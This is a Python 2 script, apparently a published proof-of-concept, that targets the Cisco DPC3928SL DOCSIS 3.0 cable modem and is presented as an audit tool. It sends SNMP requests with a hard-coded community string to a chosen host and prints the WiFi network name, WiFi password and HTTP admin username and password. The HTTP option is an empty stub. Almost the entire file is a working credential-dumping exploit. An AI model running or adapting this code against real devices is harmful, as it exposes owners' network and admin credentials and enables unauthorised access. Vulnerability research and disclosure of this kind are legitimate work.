# -*- coding: utf-8 -*- 
import socket
import argparse
import random

from pktSnmp import * 

testMethod 	= ['snmp','http','all']
check 		= ['credentials','system','config','all']

banner = '''
[*] ======================================================  [*]
[*] Suite 'COW'
[*] ------------------------------------------------------
[*] Pwned -  DPC3928SL DOCSIS 3.0 -
[*] ------------------------------------------------------
[*] [by]
[*] 	+Bertin Bervis Bonilla 
[*] 	+Ezequiel Fernandez
[*]
[*] ======================================================  [*]


'''
parser = argparse.ArgumentParser(
	description='Test your Cablemodem -  DPC3928SL DOCSIS 3.0 - ',
	epilog="auditCableModem.py --host <host> --method <method> --check < option-check >",
	version="0.1"
)

parser.add_argument('--host',	dest="aHOST", 	help='Host', 		required=True)
parser.add_argument('--method', dest="aMETHOD", help='Method', 		choices=['http', 'snmp','all'], required=True)
# READ \ WRITE
parser.add_argument('--check', 	dest="aCHECK", 	help='view ', 		choices=['sysinfo','credentials', 'all'])
parser.add_argument('--set', 	dest="aSET", 	help='Set config', 	choices=['credentials', 'system','all'], default='credentials')

args		=  parser.parse_args()

HOST		=  args.aHOST
METHOD		=  (args.aMETHOD).lower()
CHECK		=  str(args.aCHECK).lower()

snmpPORT 	= 	['161','162']

httpPORT 	= 	['80','8080']

frmSnmp 	= 	'' 
 
# ---------------------------------------------------------------------------------- #
testOIDs = [
		'2b06010401a23d020202010504010e0103ce11'	, 	# wifi ESSID
		'2b06010401a23d02020201050402040102ce11'	, 	# WIFI pass
		'2b06010401a30b0204010106010100' 			,
		'2b06010401a30b0204010106010200'

]

msgOids = [

		'wifi - ESSID:\t'		,
		'wifi - PASS:\t'		,
		'HTTP USER\t'		,
		'HTTP PASSWD\t'		
	]

'''
Forma mas 'limpia' como contenedor de OIDs
plimPlamPlum-OIDs = {	
				0 :  [ '2b06010401a23d020202010504010e0103ce11' , 	"wifi ESSID:\t"		],
				1 :  [ '2b06010401a23d02020201050402040102ce11' , 	"pass PASS:\t" 		],
				2 :  [ '2b06010401a30b0204010106010100' 		,	"HTTP USER\t" 		],
				3 :  [ '2b06010401a30b0204010106010200'			,	"HTTP PASSWD\t" 	]
			#	4 :  [ 'no_more'	,	"no_more" 	],

				}
'''
# ---------------------------------------------------------------------------------- #


def snmpMethod(addrOID,nmComm,transaction):

	frameSNMP = getFUllPkt(addrOID,nmComm)
	#print 'enviando '+frameSNMP

	client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

	client.sendto(frameSNMP.decode('hex'),(HOST,int(snmpPORT[0])))
	response1  = client.recv(1024).encode('hex')


	# ------------------------------------------------------------------ #
	lengthOID 	= int(len(addrOID))
	initOID 	= int(response1.find(addrOID))
	finOID  	= initOID + lengthOID

	initResp  	=  finOID + 4
	# ------------------------------------------------------------------ #

	viewResponse = str(response1[initResp:]).decode('hex')

	#print 'DBG -- full response :'+response1
	print msgOids[transaction]+viewResponse
	
	
	if transaction == 1:
		print 'pass length: \t'+ str(len(viewResponse)) + '\n'


	client.close()

def httpMethod():
	print 'plin plan plum'
	print 'Aki Bertin'
	print 'wait...'


def initApp():
	communityString = '696e7365637572697479'
	transID = 0
	if METHOD == testMethod[0]:
		for oids in testOIDs:
			# snmpMethod(addrOID,nmComm,transaction)
			msgOids[transID]
			snmpMethod(oids,communityString,transID)
			
			transID +=1

	elif METHOD == testMethod[1]:
			httpMethod()
	else:
		print 'bad method'



initApp()